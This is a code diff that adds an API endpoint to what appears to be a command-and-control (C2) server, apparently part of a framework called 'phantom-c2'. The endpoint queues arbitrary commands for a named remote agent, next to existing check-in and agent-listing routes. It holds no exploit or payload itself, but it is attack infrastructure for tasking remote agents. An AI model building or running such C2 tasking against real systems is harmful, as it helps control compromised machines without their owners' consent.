@@ -666,6 +666,21 @@ async def c2_checkin(request: C2AgentRequest, engine=Depends(get_engine)):
     return {"status": "unknown_operation"}
 
 
+@app.post("/api/c2/agents/{agent_id}/command")
+async def c2_send_command(agent_id: str, body: Dict, engine=Depends(get_engine)):
+    """Send a command to a specific C2 agent."""
+    c2_module = engine.get_module("phantom-c2")
+    if not c2_module:
+        raise HTTPException(status_code=503, detail="C2 module not loaded")
+    command = body.get("command", "")
+    if not command:
+        raise HTTPException(status_code=400, detail="command is required")
+    if agent_id not in c2_module._agents:
+        raise HTTPException(status_code=404, detail=f"Agent {agent_id} not found")
+    cmd = c2_module._queue_command(agent_id, command)
+    return {"queued": True, "command_id": cmd.command_id, "agent_id": agent_id}
+
+
 @app.get("/api/c2/agents")
 async def c2_list_agents(engine=Depends(get_engine)):
     """List all C2 agents."""
